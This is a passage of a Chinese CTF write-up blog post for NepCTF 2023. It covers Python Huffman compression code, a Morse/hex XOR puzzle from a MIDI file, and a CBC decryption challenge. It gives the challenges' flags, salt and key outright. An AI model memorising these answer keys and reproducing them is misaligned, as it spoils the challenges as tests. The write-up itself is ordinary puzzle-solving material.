class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;&quot;</span>.join(decompressed_data))</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HuffmanNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, char, freq</span>):</span><br><span class="line">        self.char = char</span><br><span class="line">        self.freq = freq</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lt__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_tree</span>(<span class="params">frequencies</span>):</span><br><span class="line">    heap = [HuffmanNode(char, freq) <span class="keyword">for</span> char, freq <span class="keyword">in</span> frequencies.items()]</span><br><span class="line">    heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(heap) &gt; <span class="number">1</span>:</span><br><span class="line">        left = heapq.heappop(heap)</span><br><span class="line">        right = heapq.heappop(heap)</span><br><span class="line">        merged = HuffmanNode(<span class="literal">None</span>, left.freq + right.freq)</span><br><span class="line">        merged.left = left</span><br><span class="line">        merged.right = right</span><br><span class="line">        heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_codes</span>(<span class="params">node, current_code, huffman_codes</span>):</span><br><span class="line">    <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        huffman_codes[node.char] = current_code</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    build_huffman_codes(node.left, current_code + <span class="string">&#x27;0&#x27;</span>, huffman_codes)</span><br><span class="line">    build_huffman_codes(node.right, current_code + <span class="string">&#x27;1&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> byte <span class="keyword">not</span> <span class="keyword">in</span> frequencies:</span><br><span class="line">            frequencies[byte] = <span class="number">0</span></span><br><span class="line">        frequencies[byte] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line">    huffman_codes = &#123;&#125;</span><br><span class="line">    build_huffman_codes(root, <span class="string">&#x27;&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line">    compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        compressed_data += huffman_codes[byte]</span><br><span class="line"></span><br><span class="line">    padding = <span class="number">8</span> - <span class="built_in">len</span>(compressed_data) % <span class="number">8</span></span><br><span class="line">    compressed_data += <span class="string">&#x27;0&#x27;</span> * padding</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Write frequency information</span></span><br><span class="line">        f.write(<span class="built_in">bytes</span>([<span class="built_in">len</span>(frequencies)]))</span><br><span class="line">        <span class="keyword">for</span> byte, freq <span class="keyword">in</span> frequencies.items():</span><br><span class="line">            f.write(<span class="built_in">bytes</span>([byte, (freq &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, freq &amp; <span class="number">0xFF</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Write compressed data</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(compressed_data), <span class="number">8</span>):</span><br><span class="line">            byte = compressed_data[i:i+<span class="number">8</span>]</span><br><span class="line">            f.write(<span class="built_in">bytes</span>([<span class="built_in">int</span>(byte, <span class="number">2</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_file = <span class="string">&#x27;input.txt&#x27;</span></span><br><span class="line">    compressed_file = <span class="string">&#x27;compressed.bin&#x27;</span></span><br><span class="line">    decompressed_file = <span class="string">&#x27;decompressed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 压缩文件</span></span><br><span class="line">    <span class="comment"># compress(input_file, compressed_file)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解压缩文件</span></span><br><span class="line">    decompress(compressed_file, decompressed_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691934385760-6a705515-5f1a-43ad-b628-8221ab50c7a1.png#averageHue=%23fcfcfc&clientId=u3f8a18cd-6a04-4&from=paste&height=588&id=u9bbeb925&originHeight=735&originWidth=1580&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17745&status=done&style=none&taskId=u0c6ee28a-0c56-4171-838d-f4175991119&title=&width=1264" alt="image.png"></p>
<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>NepCTF{H4ve_Fun_1N_This_Game}</p>
<h2 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h2><p>给了mid文件，audacity打开先<br>前部分是莫斯后半部分是16进制</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">youshouldusethistoxorsomething</span><br><span class="line">0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</span><br></pre></td></tr></table></figure>
<p>然后异或一下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691934496505-8deac304-3b9b-4c20-be00-fe3e16773957.png#averageHue=%23fbfbfb&clientId=u3f8a18cd-6a04-4&from=paste&height=864&id=uc8542fbd&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=135856&status=done&style=none&taskId=ub1d3a2c7-fcad-496f-9e12-fc4ba151803&title=&width=1536" alt="image.png"></p>
<h2 id="你也喜欢三月七么"><a href="#你也喜欢三月七么" class="headerlink" title="你也喜欢三月七么"></a>你也喜欢三月七么</h2><p>考的是个CBC的解密。关键是找到salt和key<br>题目描述告诉我们群的名称是salt了，然后key是salt的sha256</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">salt = NepCTF2023</span><br><span class="line">key = dd8e671df3882c5be6423cd030bd7cb6</span><br></pre></td></tr></table></figure>
<p>然后把给的cyphertext放到cyberchef解密一下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691934618877-2af11a79-d8b8-490a-b1a5-fe32fd17e0ea.png#averageHue=%23fbfafa&clientId=u3f8a18cd-6a04-4&from=paste&height=576&id=u32d33aed&originHeight=720&originWidth=1519&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56424&status=done&style=none&taskId=ud086a30f-12f2-4895-8252-02d5f43290c&title=&width=1215.2" alt="image.png"><br>一串十六进制，解密一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691934645675-33b2738f-de51-4fb4-a225-32c76577a46d.png#averageHue=%23fafaf9&clientId=u3f8a18cd-6a04-4&from=paste&height=592&id=u97eb446b&originHeight=740&originWidth=1550&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=73633&status=done&style=none&taskId=u861127fe-8f35-46d0-8ed6-81dc30d5110&title=&width=1240" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691934654495-16ed8fd2-b30c-4316-aa75-9bbed6ffb0fc.png#averageHue=%235f5f5f&clientId=u3f8a18cd-6a04-4&from=paste&height=230&id=udc38cd00&originHeight=288&originWidth=1128&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27723&status=done&style=none&taskId=u3629dd07-0a00-4507-9bf3-c3d80778d36&title=&width=902.4" alt="image.png"><br>星穹铁轨，启动！<br>最后flag是<code>NepCTF&#123;HRP_aIways_likes_March_7th&#125;</code></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/CTF/" class="tag">#CTF</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/08/28/%E8%87%B4%E4%B8%80%E5%B9%B4%E5%89%8D%E7%9A%84%E8%87%AA%E5%B7%B1%E3%80%82/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">致一年前的自己。</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">SPEL表达式注入总结及回显技术</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>